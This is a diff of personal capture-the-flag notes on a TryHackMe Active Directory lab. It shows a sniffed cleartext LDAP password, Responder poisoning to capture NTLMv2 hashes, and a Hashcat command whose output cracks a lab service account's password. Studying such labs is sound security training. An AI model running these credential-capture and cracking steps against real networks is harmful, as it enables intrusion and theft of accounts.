@@ -526,9 +526,6 @@ listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
         0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
         0x0060:  6461 7070 6173 7331 40                   dappass1@
 ...
-
-
-
 ```
 
 
@@ -625,11 +622,20 @@ Just check and stop the process for now and retry:
 sudo systemctl stop slapd
 sudo systemctl status slapd
 ```
-On retry I also tested LDAP and responder pics that up to
+
+When a victim authenticates, you get output like:
 
 ```
-┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Learning_modules/Breaching_Active_Directory]
-└─$ sudo responder -I breachad 
+[SMBv2] NTLMv2-SSP Username : ZA\<service account>
+[SMBv2] NTLMv2-SSP Hash     : <hash>
+```
+
+On retry I also tested LDAP and responder pics that up to
+
+Because you’re on a VPN, poisoning is limited — THM simulates an authentication attempt every ~30 minutes.
+
+```
+$ sudo responder -I breachad 
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -712,16 +718,6 @@ On retry I also tested LDAP and responder pics that up to
 
 ```
 
-
-Because you’re on a VPN, poisoning is limited — THM simulates an authentication attempt every ~30 minutes.
-
-When a victim authenticates, you get output like:
-
-```
-[SMBv2] NTLMv2-SSP Username : ZA\<service account>
-[SMBv2] NTLMv2-SSP Hash     : <hash>
-```
-
 4. Cracking the Captured Hash
 
 Once you have the NTLMv2‑SSP hash, you can crack it offline using Hashcat:
@@ -729,6 +725,14 @@ Once you have the NTLMv2‑SSP hash, you can crack it offline using Hashcat:
 hashcat -m 5600 <hashfile> <wordlist> --force
 ```
 If the password is weak, you recover valid AD credentials.
+
+Through Hashcat password from the NTML saved to file was obtained: 
+```
+D:\AppsNDrivers\hashcat-6.2.6>hashcat -m 5600 -d 2 Z:\...\NTLMHash.txt Z:\...\passwordlist-1647876320267.txt
+...
+SVCFILECOPY::ZA:84140fdd682af1f7:fd777c8faf134b10880c00ce2b2f1b0e:0101000000000000800a76c009f7dc01247...032000000000000000000:FPassword1!
+...
+```
 
 5. Relaying the Challenge
 Instead of cracking the hash, you can relay it to another SMB server.
